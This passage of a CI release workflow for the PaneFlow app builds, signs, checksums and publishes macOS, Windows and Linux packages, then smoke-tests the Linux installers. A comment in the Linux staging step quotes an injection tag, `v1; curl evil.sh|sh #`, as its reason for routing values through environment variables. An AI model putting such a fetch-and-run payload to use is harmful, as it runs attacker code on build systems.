      # absorbs the resulting empty-asset condition without blocking the
      # Linux release legs.
      #
      # The output filename `paneflow-<tag>-<arch>-apple-darwin.dmg` is
      # chosen to match US-008's `update_checker.rs::pick_asset`; any
      # other shape would silently break the in-app update prompt for
      # macOS users.
      - name: Produce .dmg
        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
        env:
          TAG: ${{ github.ref_name }}
          ARCH: ${{ matrix.arch }}
        run: |
          set -euo pipefail
          version="${TAG#v}"
          bash scripts/create-dmg.sh --version "$version" --arch "$ARCH"

      # Stage the .dmg + SHA-256 sibling into release-assets/ so the
      # downstream `release` job picks it up alongside the Linux-leg
      # artifacts. Mirrors the sha256 pattern used by the tar.gz step.
      # Linux legs skip this entirely; US-019 adds the macos-14 matrix
      # leg that activates it. US-023: gated on signing_available so
      # unsigned legs produce no release asset.
      - name: Stage macOS .dmg
        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
        env:
          TAG: ${{ github.ref_name }}
          ARCH: ${{ matrix.arch }}
        run: |
          set -euo pipefail
          mkdir -p release-assets
          # US-019: filenames drop the leading `v` to match US-008's
          # documented convention (paneflow-<semver>-<arch>-apple-darwin.dmg).
          version="${TAG#v}"
          dmg="paneflow-${version}-${ARCH}-apple-darwin.dmg"
          cp "dist/${dmg}" "release-assets/${dmg}"
          ( cd release-assets && shasum -a 256 "${dmg}" > "${dmg}.sha256" )
          ls -la release-assets/

      # ─── US-016 Windows MSI: toolchain preflight ─────────────────────────
      # Dormant today (no windows-2022 matrix leg) — activates when US-017
      # adds the leg. The `if: runner.os == 'Windows'` guard keeps Linux
      # and macOS legs untouched. Mirrors the dormant macOS sign/notarize
      # steps that pre-dated the macOS matrix leg (US-015/US-016 macOS).
      #
      # ┌─ NOTE to US-017 implementer ────────────────────────────────────┐
      # │ AC-4 of US-016 requires the Windows matrix entry to carry       │
      # │ `continue-on-error: true` (parity with Intel Mac, line 59), so  │
      # │ an Azure signing outage does not block Linux/macOS legs from    │
      # │ publishing. Copy the Intel Mac entry pattern — do NOT omit.     │
      # └─────────────────────────────────────────────────────────────────┘
      #
      # windows-2022 preinstalls WiX 3.14.1.8722. signtool.exe lives in
      # the Windows 10/11 SDK but is NOT resolved here: sign-windows.ps1
      # does its own SDK scan (defense in depth — if the runner image
      # ever drops it, the script's clear error is better than a silent
      # PATH mismatch between this step and the script). Preflight only
      # handles WiX because cargo-wix errors are cryptic otherwise.
      - name: Preflight WiX v3 toolchain
        if: runner.os == 'Windows'
        shell: pwsh
        run: |
          # cargo-wix 0.3.9 needs candle.exe + light.exe. Preinstalled
          # on windows-2022 at C:\Program Files (x86)\WiX Toolset v3.14\bin\.
          # v3.11 retained as a defensive fallback — if the image ever
          # rolls back, emit a Write-Warning so the drift is visible in
          # the CI log rather than silently selecting an older toolset
          # that may emit subtly different MSIs.
          $wixRoots = @(
              'C:\Program Files (x86)\WiX Toolset v3.14\bin',
              'C:\Program Files (x86)\WiX Toolset v3.11\bin'
          )
          $wixBin = $wixRoots | Where-Object { Test-Path $_ } | Select-Object -First 1
          if (-not $wixBin) {
              throw "WiX v3 not found under any known path. cargo-wix 0.3.9 requires WiX v3 (candle.exe/light.exe). Runner image may have dropped the preinstalled toolset — add an explicit install step (choco install wixtoolset --version 3.14.1)."
          }
          if ($wixBin -match 'v3\.11') {
              Write-Warning "Falling back to WiX v3.11 — windows-2022 image normally ships v3.14. Verify runner-image changelog for a silent WiX downgrade."
          }
          Write-Output "Using WiX: $wixBin"
          Add-Content -Path $env:GITHUB_PATH -Value $wixBin

      # cargo-wix itself is NOT preinstalled on windows-2022. Pinned to
      # 0.3.9 (latest 2025-03 release; no 0.4.x exists yet that supports
      # WiX v4 — tracked upstream as volks73/cargo-wix#202). The
      # Swatinem/rust-cache step above caches `~/.cargo/bin`, so this is
      # ~2 min cold / ~10 s cached.
      - name: Install cargo-wix (pinned)
        if: runner.os == 'Windows'
        run: cargo install cargo-wix --version 0.3.9 --locked

      # ─── US-016 AC-1: Produce MSI ────────────────────────────────────────
      # cargo-wix reads [package.metadata.wix] in src-app/Cargo.toml (US-013)
      # and `packaging/wix/main.wxs` to drive candle → light. The
      # `--install-version` flag overrides the MSI's ProductVersion with
      # the bare semver (no leading `v`) — required because WiX's
      # ProductVersion schema rejects `v0.1.7` and accepts only `0.1.7`.
      #
      # Output: `target/wix/paneflow-<ver>-x86_64.msi`. The `--target`
      # flag tells cargo-wix which release binary to pick up
      # (`target/x86_64-pc-windows-msvc/release/paneflow.exe`) but the
      # installer output directory is always `target/wix/` regardless —
      # do NOT assume the triple folder.
      - name: Produce MSI
        if: runner.os == 'Windows'
        shell: bash
        env:
          TAG: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          version="${TAG#v}"
          # --no-build: the "Build release binary" step above already
          # produced target/x86_64-pc-windows-msvc/release/paneflow.exe.
          # Without this flag cargo-wix 0.3.9 internally re-runs
          # `cargo build --release`, duplicating ~3-5 min of compile on
          # a cold runner. Matches the macOS pattern where
          # bundle-macos.sh consumes a pre-built binary.
          cargo wix build \
            --no-build \
            --package paneflow-app \
            --target x86_64-pc-windows-msvc \
            --install-version "$version"
          ls -la target/wix/

      # ─── US-024: Detect Windows signing secrets ─────────────────────────
      # Mirrors the macOS pattern (line ~585): emit a single boolean
      # output `signing_available` so the Sign + Verify steps below can
      # short-circuit when ANY of the 6 Azure Trusted Signing secrets is
      # missing. AC5: a missing-secret leg degrades to an unsigned MSI
      # with a visible $GITHUB_STEP_SUMMARY banner, instead of the leg
      # hard-failing inside sign-windows.ps1's env-var precondition check.
      #
      # Secrets are routed through env: so an empty/unset secret resolves
      # to an empty env var (rather than the literal `${{ secrets.NAME }}`
      # placeholder which would always look "present"). The 6 names match
      # what `scripts/sign-windows.ps1` reads at runtime — see
      # `memory/project_windows_signing.md` for the canonical list.
      - name: Detect Windows signing secrets
        id: windows_signing
        if: runner.os == 'Windows'
        shell: bash
        env:
          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
        run: |
          set -euo pipefail
          if [ -n "${AZURE_TENANT_ID:-}" ] \
             && [ -n "${AZURE_CLIENT_ID:-}" ] \
             && [ -n "${AZURE_CLIENT_SECRET:-}" ] \
             && [ -n "${AZURE_TRUSTED_SIGNING_ENDPOINT:-}" ] \
             && [ -n "${AZURE_TRUSTED_SIGNING_ACCOUNT:-}" ] \
             && [ -n "${AZURE_TRUSTED_SIGNING_CERT_PROFILE:-}" ]; then
              echo "All 6 Azure Trusted Signing secrets are present — will sign + verify."
              echo "signing_available=true" >> "$GITHUB_OUTPUT"
          else
              echo "::warning title=Windows signing skipped::One or more AZURE_* secrets are missing — emitting an UNSIGNED .msi. See docs/release/windows-signing.md."
              echo "signing_available=false" >> "$GITHUB_OUTPUT"
          fi

      # ─── US-016 AC-2 / US-024 AC-1+AC-3: Sign MSI via Azure Trusted Signing ───
      # Invokes the US-015 script, which fetches the
      # `Microsoft.ArtifactSigning.Client` NuGet (pinned 1.0.128) into a
      # temp dir, writes a metadata.json with ExcludeCredentials, and
      # calls `signtool.exe sign` with the 3-host timestamp retry chain
      # (acs.microsoft.com → digicert → sectigo) — satisfying US-024 AC-3.
      # Verification (`signtool verify /pa` + `Get-AuthenticodeSignature`)
      # is embedded in the script; an additional standalone verify step
      # below makes it visible at the workflow level (AC-6).
      #
      # Why script-not-action (US-024 AC-1 reconciliation): the official
      # `azure/trusted-signing-action` is a thin wrapper around the same
      # `Microsoft.ArtifactSigning.Client` NuGet, but accepts only ONE
      # `timestamp-rfc3161` URL — it cannot satisfy AC-3's 3-server
      # fallback chain. The script invokes the same official Microsoft
      # client at a lower level (signtool /dlib), and is therefore the
      # canonical Azure Trusted Signing integration here. See
      # `docs/release/windows-signing.md §"Why a script and not the
      # official action"` for the full rationale.
      #
      # Secrets (all 6 required — populated per US-014 onboarding):
      #   AZURE_TENANT_ID / AZURE_CLIENT_ID / AZURE_CLIENT_SECRET
      #       — service principal for EnvironmentCredential auth
      #   AZURE_TRUSTED_SIGNING_ENDPOINT / _ACCOUNT / _CERT_PROFILE
      #       — addressing for the code-signing account / cert profile
      #
      # AC-5: when `signing_available` is false the step is skipped; the
      # MSI still ships, unsigned, picked up by Stage Windows assets and
      # reported in $GITHUB_STEP_SUMMARY by the banner step below.
      - name: Sign MSI
        id: sign_msi
        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
        shell: pwsh
        env:
          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
          TAG: ${{ github.ref_name }}
        run: |
          $version = $env:TAG -replace '^v', ''
          # Hard-validate $version as strict semver before it flows into
          # a glob pattern. github.ref_name is attacker-controlled; a
          # tag like `v1.0.0*;evil` would produce a malformed glob. This
          # doesn't enable command injection (Get-ChildItem -Filter is
          # not an eval surface), but a crafted tag could match the
          # wrong MSI or skip signing silently. Belt-and-suspenders.
          if ($version -notmatch '^\d+\.\d+\.\d+([.-][0-9A-Za-z.-]+)?$') {
              throw "TAG '$env:TAG' does not strip to a valid semver (got '$version'). Refusing to glob for MSI."
          }
          $msi = Get-ChildItem -Path 'target/wix' -Filter "paneflow-$version-*.msi" |
              Select-Object -First 1 -ExpandProperty FullName
          if (-not $msi) {
              throw "No MSI found under target/wix/ matching paneflow-$version-*.msi — cargo wix build may have failed or emitted an unexpected filename."
          }
          Write-Output "Signing: $msi"
          # Quoted "$msi" so a path with spaces (unlikely with cargo-wix
          # defaults but defensive) is passed as one argv element.
          pwsh -NoProfile -File ./scripts/sign-windows.ps1 -InputFile "$msi"

      # ─── US-024 AC-6: Verify MSI signature at workflow level ─────────────
      # `sign-windows.ps1` already runs `signtool verify /pa /v` + an
      # `Get-AuthenticodeSignature` Authenticode check internally — this
      # step re-runs the bare `signtool verify /pa /v` so the verification
      # output is unambiguously visible at the workflow level (the
      # script's verify is buried inside its log section). AC-6 demands
      # the literal "Successfully verified" string; we grep for it and
      # fail the step if absent.
      # Explicit `steps.sign_msi.outcome == 'success'` guard alongside the
      # implicit `success()` default: belt-and-braces against a future
      # editor adding `continue-on-error: true` to the Sign MSI step,
      # which would let `success()` evaluate true after a sign failure
      # and run Verify against an unsigned artifact.
      - name: Verify MSI signature
        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true' && steps.sign_msi.outcome == 'success'
        shell: pwsh
        env:
          TAG: ${{ github.ref_name }}
        run: |
          $version = $env:TAG -replace '^v', ''
          if ($version -notmatch '^\d+\.\d+\.\d+([.-][0-9A-Za-z.-]+)?$') {
              throw "TAG '$env:TAG' does not strip to a valid semver (got '$version')."
          }
          $msi = Get-ChildItem -Path 'target/wix' -Filter "paneflow-$version-*.msi" |
              Select-Object -First 1 -ExpandProperty FullName
          if (-not $msi) {
              throw "No MSI found under target/wix/ matching paneflow-$version-*.msi."
          }

          # Resolve signtool the same way sign-windows.ps1 does — keep
          # the two paths in sync so a runner-image SDK change cannot
          # silently desynchronize them.
          $sdkRoot = 'C:\Program Files (x86)\Windows Kits\10\bin'
          $signtool = $null
          if (Test-Path -LiteralPath $sdkRoot) {
              $signtool = Get-ChildItem -Path $sdkRoot -Recurse -Filter 'signtool.exe' -ErrorAction SilentlyContinue |
                  Where-Object { $_.FullName -match '\\x64\\' } |
                  Sort-Object { try { [version]$_.Directory.Parent.Name } catch { [version]'0.0.0.0' } } -Descending |
                  Select-Object -First 1 -ExpandProperty FullName
          }
          if ([string]::IsNullOrEmpty($signtool)) {
              $onPath = Get-Command -Name signtool.exe -ErrorAction SilentlyContinue
              if ($null -ne $onPath) { $signtool = $onPath.Source }
          }
          if ([string]::IsNullOrEmpty($signtool)) {
              throw "signtool.exe not found."
          }

          Write-Output "Verifying: $msi"
          # Capture stdout+stderr so we can grep for the AC-6 sentinel.
          # 2>&1 routes signtool's diagnostic output (which goes to
          # stderr) into the same stream as the success line.
          $verifyOutput = & $signtool verify /pa /v "$msi" 2>&1
          $verifyExit = $LASTEXITCODE
          $verifyOutput | ForEach-Object { Write-Output $_ }
          if ($verifyExit -ne 0) {
              throw "signtool verify exit code $verifyExit"
          }
          # Anchor the regex with `^\s*` so the AC-6 sentinel must appear
          # as its own line (signtool emits "    Successfully verified:
          # <path>" with leading whitespace). A bare substring match could
          # in theory be tricked by a future signtool diagnostic that
          # echoes the phrase mid-sentence in an error path.
          if (-not ($verifyOutput -match '^\s*Successfully verified')) {
              throw "signtool verify did not emit 'Successfully verified' — AC-6 sentinel missing."
          }
          Write-Output "AC-6 sentinel 'Successfully verified' present."

      # ─── US-024 AC-5: Record unsigned Windows build in job summary ──────
      # Mirror of the macOS unsigned-build banner step (line ~631). When
      # `signing_available=false`, the leg ships an unsigned .msi (the
      # Stage Windows assets step below picks up the unsigned cargo-wix
      # output unchanged). The banner makes this immediately visible in
      # the workflow run summary so a release reviewer can decide
      # whether to retag after populating the missing secrets.
      - name: Record unsigned Windows build in job summary
        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available != 'true'
        shell: bash
        env:
          ARCH: ${{ matrix.arch }}
          TAG: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          {
              echo "## ⚠️ Unsigned Windows build (${ARCH}, ${TAG})"
              echo
              echo "One or more AZURE_* secrets were missing, so this leg shipped an"
              echo "**unsigned** \`.msi\`. Windows SmartScreen will flag it as"
              echo "\"Unknown Publisher\" on first launch."
              echo
              echo "Required secrets: \`AZURE_TENANT_ID\`, \`AZURE_CLIENT_ID\`,"
              echo "\`AZURE_CLIENT_SECRET\`, \`AZURE_TRUSTED_SIGNING_ENDPOINT\`,"
              echo "\`AZURE_TRUSTED_SIGNING_ACCOUNT\`, \`AZURE_TRUSTED_SIGNING_CERT_PROFILE\`."
              echo
              echo "Onboarding runbook: \`docs/release/windows-signing.md\`."
          } >> "$GITHUB_STEP_SUMMARY"

      # ─── US-016 AC-3: Stage the signed MSI + SHA-256 sidecar ─────────────
      # Rename from cargo-wix's default (paneflow-<ver>-x86_64.msi) to the
      # canonical release asset name paneflow-<ver>-x86_64-pc-windows-msvc.msi
      # that `update_checker::pick_asset` (US-011) matches against. The
      # `-pc-windows-msvc` suffix is the Rust triple, kept in the filename
      # so the in-app updater's asset picker can key on the triple without
      # an explicit per-OS branch.
      #
      # Same env-routing hardening as the Linux/macOS stage steps: `TAG`
      # goes via the `env:` block, never inlined as `${{ ... }}` inside
      # the shell body — so an attacker-controlled tag cannot shell-inject.
      - name: Stage Windows assets
        if: runner.os == 'Windows'
        shell: bash
        env:
          TAG: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          mkdir -p release-assets
          version="${TAG#v}"
          # Resolve the MSI via shell glob (shellcheck SC2012: `ls | head`
          # mishandles non-alphanumeric filenames; a bash array from glob
          # does not). `nullglob` + array-length check distinguishes
          # "no match" from a literal unexpanded glob string.
          shopt -s nullglob
          matches=( target/wix/paneflow-"${version}"-*.msi )
          shopt -u nullglob
          if [ "${#matches[@]}" -eq 0 ]; then
              echo "::error::No MSI found at target/wix/paneflow-${version}-*.msi" >&2
              exit 1
          fi
          src="${matches[0]}"
          dst="paneflow-${version}-x86_64-pc-windows-msvc.msi"
          cp "${src}" "release-assets/${dst}"
          ( cd release-assets && sha256sum "${dst}" > "${dst}.sha256" )
          ls -la release-assets/

      # --- Stage all 4 artifacts with canonical names ---
      # Linux-leg-only: the macOS .dmg is staged by its own step above.
      # Context values are passed via `env:` rather than inlined as
      # `${{ github.ref_name }}` inside the shell body — otherwise an
      # attacker-controlled tag like `v1; curl evil.sh|sh #` would be
      # shell-injected when bash parses the script. `env:` injects them
      # as environment variables, immune to shell interpretation.
      - name: Stage release assets
        if: runner.os == 'Linux'
        env:
          TAG: ${{ github.ref_name }}
          ARCH: ${{ matrix.arch }}
          TARGET: ${{ matrix.target }}
        # `VERSION="${TAG#v}"` strips the leading `v` so all Linux assets
        # are named `paneflow-<semver>-<arch>.<ext>` (no `v` prefix),
        # aligning with the macOS DMG and Windows MSI naming conventions
        # already in this workflow. The invariant we MUST preserve is the
        # filename suffix `-<arch>.<ext>`. That's what
        # `update_checker.rs::pick_asset` matches on
        # (`a.name.to_ascii_lowercase().ends_with("-x86_64.deb")` etc.),
        # so dropping the `v` from the prefix is safe for v0.2.x clients
        # auto-updating to v0.3.0+.
        run: |
          set -euo pipefail
          VERSION="${TAG#v}"
          mkdir -p release-assets
          cp "target/bundle/paneflow-${VERSION}-${ARCH}.tar.gz"            "release-assets/"
          cp "target/appimage/paneflow-${VERSION}-${ARCH}.AppImage"        "release-assets/"
          cp "target/appimage/paneflow-${VERSION}-${ARCH}.AppImage.zsync"  "release-assets/"
          # cargo-deb names the file from crate version + revision + the
          # Debian arch tag derived from the target triple
          # (e.g. paneflow_0.3.0-1_amd64.deb on x86_64,
          #  paneflow_0.3.0-1_arm64.deb on aarch64). Rename to the canonical
          # paneflow-<version>-<arch>.deb form the GitHub release uses. The
          # target-scoped directory keeps the glob unambiguous per matrix
          # leg (US-019).
          cp target/"${TARGET}"/debian/paneflow_*.deb \
             "release-assets/paneflow-${VERSION}-${ARCH}.deb"
          # cargo-generate-rpm names the file from crate version + release +
          # rpm arch tag (e.g. paneflow-0.3.0-1.x86_64.rpm,
          # paneflow-0.3.0-1.aarch64.rpm). Rename to the canonical
          # paneflow-<version>-<arch>.rpm form so `update_checker::pick_asset`
          # can match it (US-009's asset picker matches on `-${arch}.rpm`).
          cp target/"${TARGET}"/generate-rpm/paneflow-*.rpm \
             "release-assets/paneflow-${VERSION}-${ARCH}.rpm"
          # Emit SHA-256 siblings for every primary Linux artifact.
          # Rationale:
          #   - `.tar.gz` → consumed by the in-app updater (US-011), which
          #     fetches `<asset>.sha256` and verifies the download before
          #     swapping `$HOME/.local/paneflow.app/`.
          #   - `.deb` / `.rpm` / `.AppImage` (US-002) → out-of-band
          #     verification by downstream mirrors, security scanners, and
          #     users downloading artifacts directly from GitHub Releases.
          #
          # `test -s` guards catch the pathological case where an earlier
          # `cp` silently produced a zero-byte file (e.g. disk pressure on
          # the runner). Without them, `sha256sum` would happily hash an
          # empty file and publish a valid-but-wrong sidecar. `sha256sum`
          # itself is part of coreutils on ubuntu-22.04; it is always
          # present.
          #
          # Staying inside a single `cd release-assets` subshell keeps the
          # canonical coreutils output format `<64-hex>  <filename>` (no
          # path prefix) — essential for `sha256sum -c <asset>.sha256` to
          # work after a user downloads both files into the same directory.
          # `set -e` / `set -o pipefail` are inherited by the subshell, so
          # any single `sha256sum` failure aborts the chain and fails the
          # whole step rather than publishing a partial sidecar set.
          for art in \
              "paneflow-${VERSION}-${ARCH}.tar.gz" \
              "paneflow-${VERSION}-${ARCH}.AppImage" \
              "paneflow-${VERSION}-${ARCH}.deb" \
              "paneflow-${VERSION}-${ARCH}.rpm"
          do
              if [ ! -s "release-assets/${art}" ]; then
                  echo "::error::release-assets/${art} is missing or empty, refusing to hash." >&2
                  exit 1
              fi
          done
          ( cd release-assets \
            && sha256sum "paneflow-${VERSION}-${ARCH}.tar.gz" \
                 > "paneflow-${VERSION}-${ARCH}.tar.gz.sha256" \
            && sha256sum "paneflow-${VERSION}-${ARCH}.AppImage" \
                 > "paneflow-${VERSION}-${ARCH}.AppImage.sha256" \
            && sha256sum "paneflow-${VERSION}-${ARCH}.deb" \
                 > "paneflow-${VERSION}-${ARCH}.deb.sha256" \
            && sha256sum "paneflow-${VERSION}-${ARCH}.rpm" \
                 > "paneflow-${VERSION}-${ARCH}.rpm.sha256" )
          ls -la release-assets/

      # Upload artifacts so the smoke-test jobs below can install them
      # in clean Ubuntu / Fedora containers. `compression-level: 0`
      # — artifacts are already compressed (.deb/.rpm/.tar.gz/.AppImage).
      - name: Upload release artifacts (for smoke-test jobs)
        uses: actions/upload-artifact@v4
        with:
          # US-019: include runner.os in the artifact name because Linux
          # aarch64 and macOS aarch64 would otherwise collide on
          # `release-assets-aarch64`. The publish + smoke jobs glob
          # `release-assets-*`, so the new pattern is compatible.
          name: release-assets-${{ matrix.arch }}-${{ runner.os }}
          path: release-assets/
          retention-days: 7
          compression-level: 0

  # ─── Unified release publish ────────────────────────────────────────
  # US-019 converts `build` into a matrix (x86_64 + aarch64). Calling
  # softprops/action-gh-release from each matrix leg would race two
  # concurrent API writers against the same tag: two "create release"
  # calls, two `generate_release_notes: true` bodies, overlapping
  # asset uploads. Instead, every matrix leg only uploads its
  # `release-assets-<arch>` workflow artifact; this single job runs
  # after ALL legs finish, downloads every artifact, and creates the
  # GitHub Release exactly once with the merged file set.
  #
  # Atomic-release guarantee (PRD AC6): `needs: [build]` waits for
  # every matrix leg to finish. `fail-fast: true` + hard-required legs
  # (Linux x64/aarch64, macOS aarch64) propagate a failure to cancel
  # siblings and fail `build`, so this job never runs on a broken
  # hard-required leg. Best-effort legs (Intel Mac, Windows — both
  # `continue-on-error: true`) are excluded from `fail-fast`: a failure
  # there is allowed, the `build` job is still marked success, and the
  # release ships without those assets. This keeps the release-day
  # blast radius bounded to the platforms the user base actually
  # depends on while letting experimental/best-effort legs ride along.
  release:
    name: Publish GitHub Release
    needs: build
    runs-on: ubuntu-22.04
    permissions:
      contents: write
    steps:
      - name: Download all release artifacts
        # `pattern` globs every `release-assets-*` workflow artifact
        # (x86_64 + aarch64 today, more later). `merge-multiple: true`
        # flattens them into a single directory so `files: release-assets/*`
        # picks up every built asset.
        uses: actions/download-artifact@v4
        with:
          path: release-assets
          pattern: release-assets-*
          merge-multiple: true

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          files: release-assets/*
          generate_release_notes: true
          draft: false
          prerelease: ${{ contains(github.ref_name, 'alpha') || contains(github.ref_name, 'beta') || contains(github.ref_name, 'rc') }}

  # ─── US-016 smoke tests ──────────────────────────────────────────────
  # Exercise the postinst scripts in clean distro containers to catch
  # the Cursor-style "broken apt update" regression that US-016
  # guards against. These jobs depend on `build` (the matrix) and run
  # in parallel with the `release` publish job — deliberate: smoke
  # tests consume the uploaded workflow artifacts, not the GitHub
  # Release, so there's no reason to chain them. A smoke-test failure
  # surfaces as a red workflow check but does not un-publish the
  # release (by design: if the .deb/.rpm actually installed on a
  # clean host, we'd rather ship and hotfix than delete the tag).
  #
  # Smoke tests are intentionally x86_64-only even after US-019 adds
  # the aarch64 build matrix leg. The tests exercise postinst scripts
  # (shell-only, arch-agnostic) — extending them to aarch64 would buy
  # no additional coverage over the x86_64 run. Real aarch64
  # installation-and-runtime validation is US-020's scope (on-device
  # tests on a Raspberry Pi 5 / Asahi Linux).

  smoke-test-ubuntu:
    name: Smoke test — Ubuntu 22.04 (.deb postinst)
    needs: build
    runs-on: ubuntu-22.04
    container: ubuntu:22.04
    # ubuntu:22.04's default /bin/sh is dash, which does NOT support
    # `set -o pipefail`. v0.2.1 retry #3 failed at step 1 with
    # `/tmp/XXX.sh: 1: set: Illegal option -o pipefail` before reaching
    # any PaneFlow logic. Pin bash at the job level so every step uses
    # a POSIX-extension-supporting shell by default.
    defaults:
      run:
        shell: bash
    steps:
      - name: Install baseline tools
        # `apt-get install` inside the container — not the host runner.
        # `ca-certificates` + `curl` are required by our postinst's
        # GPG-fetch path.
        env:
          DEBIAN_FRONTEND: noninteractive
        run: |
          set -euo pipefail
          apt-get update -qq
          apt-get install -y --no-install-recommends \
            ca-certificates curl gnupg

      - name: Download built .deb
        uses: actions/download-artifact@v4
        with:
          # US-019: artifact name carries runner.os to avoid Linux/macOS
          # aarch64 name collisions. Linux-x86_64 leg uploads to this
          # exact name.
          name: release-assets-x86_64-Linux
          path: ./release-assets

      - name: Install paneflow.deb (exercises postinst)
        env:
          DEBIAN_FRONTEND: noninteractive
        run: |
          set -euo pipefail
          # `apt install` resolves runtime deps automatically — `dpkg -i`
          # would leave them unconfigured and force a follow-up `apt -f`.
          apt-get install -y --no-install-recommends ./release-assets/paneflow-*.deb

      - name: Assert postinst wrote paneflow.list with expected content
        run: |
          set -euo pipefail
          test -f /etc/apt/sources.list.d/paneflow.list
          grep -Fxq 'deb [signed-by=/usr/share/keyrings/paneflow-archive.gpg] https://pkg.paneflow.dev/apt stable main' \
            /etc/apt/sources.list.d/paneflow.list

      - name: Assert `apt update` completes without error (Cursor regression)
        # AC: `sudo apt update must complete without error` — modern apt
        # exits 0 even if individual sources 404, emitting `W:` warnings.
        # A non-zero exit would mean the postinst wrote a MALFORMED
        # sources line that broke the apt parser — the Cursor failure
        # mode. Exit code is the test.
        run: |
          set -euo pipefail
          apt-get update

      - name: Assert paneflow visible via apt-cache policy
        run: |
          set -euo pipefail
          # `apt-cache policy paneflow` prints `Installed: <version>` — our
          # crate version starts with 0 (0.1.x today) but the match must
          # not depend on that. Accept any digit-led version string.
          # Also use `dpkg-query` as a belt-and-braces check that catches
          # the case where apt-cache silently reports `(none)`.
          #
          # Capture-then-grep via here-strings instead of a pipe. Under
          # `set -o pipefail`, `apt-cache policy | grep -q` can flake
          # with exit 141 (SIGPIPE): grep closes its stdin as soon as
          # the first match is found, and apt-cache's multi-line output
          # gets SIGPIPE on its next write, which pipefail propagates as
          # a pipeline failure. Observed in the v0.2.3 release smoke
          # test. Here-strings have no writer process, so there is no
          # SIGPIPE surface — the input is a fully-materialised string
          # handed to grep's stdin before grep runs. dpkg-query output
          # is one line and has never been observed to flake, but we
          # switch it to the same pattern for consistency.
          policy=$(apt-cache policy paneflow)
          grep -Eq '^  Installed: [0-9]' <<< "$policy"
          status=$(dpkg-query -W -f='${Status}' paneflow)
          grep -q 'install ok installed' <<< "$status"

      - name: Idempotency — pre-existing paneflow.list is not overwritten
        env:
          DEBIAN_FRONTEND: noninteractive
        run: |
          set -euo pipefail
          # Simulate a user with a custom mirror already configured.
          # Reinstalling the package must NOT clobber their file.
          custom='deb [trusted=yes] https://mirror.example.com/paneflow stable main'
          echo "$custom" > /etc/apt/sources.list.d/paneflow.list
          apt-get install --reinstall -y --no-install-recommends \
            ./release-assets/paneflow-*.deb
          grep -Fxq "$custom" /etc/apt/sources.list.d/paneflow.list \
            || { echo "::error::postinst overwrote a pre-existing paneflow.list"; exit 1; }

  smoke-test-fedora:
    name: Smoke test — Fedora 40 (.rpm postinst)
    needs: build
    runs-on: ubuntu-22.04
    container: fedora:40
    # fedora:40 ships bash as /bin/sh already, but pin it explicitly
    # here too — keeps the smoke jobs uniform and survives a future
    # base-image swap (e.g., fedora:41+ or a minimal variant) without
    # silently regressing pipefail support.
    defaults:
      run:
        shell: bash
    steps:
      - name: Download built .rpm
        uses: actions/download-artifact@v4
        with:
          # US-019: see the deb smoke test for the same naming rationale.
          name: release-assets-x86_64-Linux
          path: ./release-assets

      - name: Install paneflow.rpm (exercises %post scriptlet)
        # `--allowerasing` handles minimal-image edge cases where a dep
        # conflicts with a pre-installed placeholder; safe in CI because
        # the clean container has no user data to erase.
        run: |
          set -euo pipefail
          dnf install -y --allowerasing ./release-assets/paneflow-*.rpm

      - name: Assert %post wrote /etc/yum.repos.d/paneflow.repo
        run: |
          set -euo pipefail
          test -f /etc/yum.repos.d/paneflow.repo
          grep -Fq '[paneflow]' /etc/yum.repos.d/paneflow.repo
          grep -Fq 'baseurl=https://pkg.paneflow.dev/rpm' /etc/yum.repos.d/paneflow.repo
          grep -Fq 'gpgcheck=1' /etc/yum.repos.d/paneflow.repo
          grep -Fq 'gpgkey=https://pkg.paneflow.dev/gpg' /etc/yum.repos.d/paneflow.repo

      - name: Assert `dnf check-update paneflow` does not hard-fail
        # Same Cursor-regression check as the apt smoke test. If
        # pkg.paneflow.dev isn't live yet (first release), dnf emits
        # `Errors during downloading metadata for repository 'paneflow'`
        # and exits non-zero. That's expected pre-infra. What we test:
        # other dnf operations still work (dnf didn't choke on the
        # .repo file itself).
        run: |
          set -euo pipefail
          dnf check-update paneflow || true
          # A repo that reaches dnf at all passes this test: we verify
          # dnf can still function on other repos (the Fedora base
          # mirror is always there in a clean container).
          dnf list installed paneflow

      - name: Idempotency — pre-existing paneflow.repo is not overwritten
        run: |
          set -euo pipefail
          # Write a pre-existing .repo file pointing at a dummy mirror;
          # verify the %post scriptlet leaves it alone on reinstall.
          # Single-line cat heredoc keeps the YAML block-scalar indent
          # contract intact (YAML requires every non-empty line to be
          # indented ≥ the first line; a multi-line shell variable with
          # column-0 continuations would violate that).
          cat > /etc/yum.repos.d/paneflow.repo <<'CUSTOMEOF'
          [paneflow]
          name=PaneFlow (custom mirror)
          baseurl=https://mirror.example.com/paneflow
          enabled=1
          gpgcheck=0
          CUSTOMEOF
          dnf reinstall -y --allowerasing ./release-assets/paneflow-*.rpm
          grep -Fq 'PaneFlow (custom mirror)' /etc/yum.repos.d/paneflow.repo \
            || { echo "::error::%post overwrote a pre-existing paneflow.repo"; exit 1; }
